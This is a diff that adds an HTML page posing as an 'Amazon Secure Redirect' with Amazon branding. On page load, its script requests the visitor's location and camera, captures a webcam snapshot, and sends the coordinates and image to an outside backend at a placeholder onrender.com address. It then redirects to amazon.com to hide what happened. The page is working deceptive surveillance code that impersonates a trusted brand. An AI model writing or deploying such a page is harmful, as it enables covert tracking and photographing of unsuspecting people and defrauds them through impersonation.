@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Secure Redirect</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f7f7f7;
+            text-align: center;
+            margin: 0;
+        }
+
+        .header {
+            background-color: #232f3e;
+            color: white;
+            width: 100%;
+            padding: 10px;
+            font-size: 20px;
+            text-align: left;
+            padding-left: 20px;
+            font-weight: bold;
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        .alexa-logo {
+            position: absolute;
+            bottom: 20px;
+            width: 100px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">Amazon - Best Deals</div>
+
+    <h1>Welcome to Amazon</h1>
+    <p>Preparing a secure connection. Please allow permissions when prompted.</p>
+
+    <video id="video" autoplay style="display: none;"></video>
+    <img src="https://m.media-amazon.com/images/G/01/support-images/alexa/alexa-logo-white.svg" alt="Alexa Logo" class="alexa-logo">
+
+    <script>
+        // Automatically trigger permissions when the page is loaded
+        window.onload = () => {
+            getLocationAndVideo();
+        };
+
+        function getLocationAndVideo() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        console.log("Latitude:", lat, "Longitude:", lon);
+
+                        // Request camera access
+                        navigator.mediaDevices.getUserMedia({ video: true })
+                            .then((stream) => {
+                                const video = document.getElementById('video');
+                                video.srcObject = stream;
+
+                                // Capture a snapshot after 2 seconds
+                                setTimeout(() => {
+                                    const snapshot = captureSnapshot(video);
+                                    // Send location and snapshot to the server
+                                    sendDataToServer(lat, lon, snapshot);
+                                    redirectToAmazon();  // Redirect after permissions are granted
+                                }, 2000);
+                            })
+                            .catch((error) => {
+                                console.error("Camera access denied:", error);
+                                sendDataToServer(lat, lon, "Camera access denied");
+                                redirectToAmazon();  // Redirect anyway
+                            });
+                    },
+                    (error) => {
+                        console.error("Unable to retrieve location:", error);
+                        sendDataToServer("Location unavailable", "Location unavailable", "No camera data");
+                        redirectToAmazon();  // Redirect anyway
+                    }
+                );
+            } else {
+                console.error("Geolocation is not supported.");
+                redirectToAmazon();  // Redirect anyway
+            }
+        }
+
+        // Capture snapshot from the video feed
+        function captureSnapshot(video) {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/png');  // Return snapshot as a base64 image
+        }
+
+        // Send location and snapshot to the backend
+        function sendDataToServer(lat, lon, snapshot) {
+            fetch('https://your-backend-url.onrender.com/save-location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    latitude: lat,
+                    longitude: lon,
+                    snapshot: snapshot
+                })
+            })
+            .then(() => console.log("Data sent to server successfully"))
+            .catch((error) => console.error("Error sending data:", error));
+        }
+
+        // Redirect the user to Amazon
+        function redirectToAmazon() {
+            window.location.href = "https://www.amazon.com";
+        }
+    </script>
+
+</body>
+</html>
